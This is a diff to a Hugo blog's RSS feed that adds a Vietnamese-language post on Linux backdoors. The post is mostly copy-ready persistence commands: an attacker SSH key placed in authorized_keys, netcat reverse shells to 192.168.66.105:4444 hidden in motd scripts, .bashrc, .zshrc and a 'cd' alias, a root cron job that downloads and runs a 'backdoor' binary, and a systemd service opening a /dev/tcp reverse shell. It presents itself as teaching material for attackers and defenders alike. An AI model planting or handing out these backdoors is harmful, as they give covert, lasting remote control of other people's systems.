@@ -6,8 +6,73 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 08 Jun 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Mon, 28 Jun 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Linux backdoors</title>
+            <link>https://tranquac.github.io/posts/2021/06/linux-backdoors/</link>
+            <pubDate>Mon, 28 Jun 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2021/06/linux-backdoors/</guid>
+            <description>Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &amp;hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng.</description>
+            <content type="html"><![CDATA[<p>Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng. Ở đây chúng ta chỉ thảo luận trong thế giới Linux!</p>
+<h3 id="backdoor-là-gì">Backdoor là gì?</h3>
+<p>Backdoor là một đoạn mã ẩn, script hay chương trình đặt trên máy mục tiêu phục vụ cho mục đích truy cập dài hạn vào mục tiêu của kẻ tấn công,với điều đó bạn không phải khai thác cùng một hệ thống hai lần. Nó chỉ đơn giản là cung cấp cho bạn quyền truy cập nhanh hơn và tức thì vào hệ thống.</p>
+<h3 id="1-ssh-keys">1. SSH Keys</h3>
+<p>SSH authorized_keys tập tin chứa một danh sách các ủy quyền người dùng / khóa công khai được phép đăng nhập vào một tài khoản cụ thể. Trong tệp này, những kẻ tấn công cũng có thể đặt các khóa công khai của chúng để tự cấp quyền và truy cập ngay vào hệ thống thông qua SSH.\</p>
+<h4 id="victim">Victim</h4>
+<p><code>ssh-keygen -t rsa</code><br>
+-&gt; generate key pair<br>
+<code>cat /$(whoami)/.ssh/id_rsa.pub &gt; /$(whoami)/.ssh/authorized_keys</code><br>
+-&gt; copy public key (id_rsa.pub) to authorized_keys</p>
+<h4 id="attacker">Attacker</h4>
+<p>Copy private key (id_rsa)<br>
+<code>chmod 600 id_rsa</code><br>
+-&gt; set permission<br>
+<code>ssh -i id_rsa username@victim</code><br>
+-&gt; ssh to victim<br>
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG"></p>
+<h3 id="2-ssh-motd">2. SSH motd</h3>
+<p>motd (Tin nhắn trong ngày) là banner xuất hiện khi bạn đăng nhập vào máy bằng SSH. Đối với Ubuntu / Debian các tập lệnh motd có thể được tìm thấy tại /etc/update-motd.d. Theo mặc định, những người dùng khác không có quyền ghi trên thư mục đó.
+<code>cd /etc/update-motd.d &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor</code><br>
+Lưu ý: &amp; -&gt; run command in background
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG"></p>
+<h3 id="3-users-bashrc--interactive-session">3. User’s .bashrc — Interactive session</h3>
+<p>.bashrc là một trong những tập lệnh khởi động được sử dụng bởi Bourne shell bash (zsh là .zshrc). Nếu có người dùng sử dụng bashlàm trình bao đăng nhập của họ, thì tập lệnh sẽ được thực thi cho mỗi phiên tương tác mà họ khởi chạy.<br>
+<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .bashrc</code><br>
+<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .zshrc</code><br>
+sẽ nhận được reverse shell khi người dùng sử dụng lệnh <code>bash</code> hay <code>su username</code>
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG"></p>
+<h3 id="4-users-bashrc--aliases">4. User’s .bashrc — Aliases</h3>
+<p>Là một kẻ tấn công, chúng ta cũng có thể đặt backdoor trong bí danh của người dùng! Đây cũng là 1 phương pháp tôi rất thích.<br>
+<code>alias cd='$(nc 192.168.66.105 4444 -e /bin/bash &amp;); cd'</code><br>
+-&gt; Chúng ta sẽ nhận được reverse shell mỗi khi người dùng sử dụng lệnh cd
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG">
+Dưới đây là một số backdoor phức tạp khác sử dụng bí danh:</p>
+<ul>
+<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
+<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
+</ul>
+<h3 id="5-cron-jobs">5. Cron jobs</h3>
+<p>Cron là một tính năng từ OS like Linux / UNIX có thể được sử dụng để thực hiện định kỳ một công việc hoặc nhiệm vụ cụ thể giống như Task Scheduler trong Windows.<br>
+<code>echo '* * * * * root cd /tmp; wget 192.168.66.105:8000/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor' &gt; /etc/cron.d/backdoor</code>
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG"></p>
+<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
+<p>Kẻ tấn công cũng có thể tạo một backdoor như một service (BaaS). Đây là một ví dụ về BaaS ( backdoor.service):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
+Type<span style="color:#f92672">=</span>simple
+User<span style="color:#f92672">=</span>root
+ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.66.105/4444 0&gt;&amp;1&#34;</span>
+<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
+WantedBy<span style="color:#f92672">=</span>multi-user.target
+</code></pre></div><p>Khi service được bắt đầu, nó khởi chạy một reverse shell cho kẻ tấn công.<br>
+<code>cd /etc/systemd/system &amp;&amp; systemctl start backdoor.service</code><br>
+Nó cũng có thể được kích hoạt khi enable.<br>
+<code>cd /etc/systemd/system &amp;&amp; systemctl enable backdoor.service</code>
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG"></p>
+]]></content>
+        </item>
         
         <item>
             <title>SQL</title>
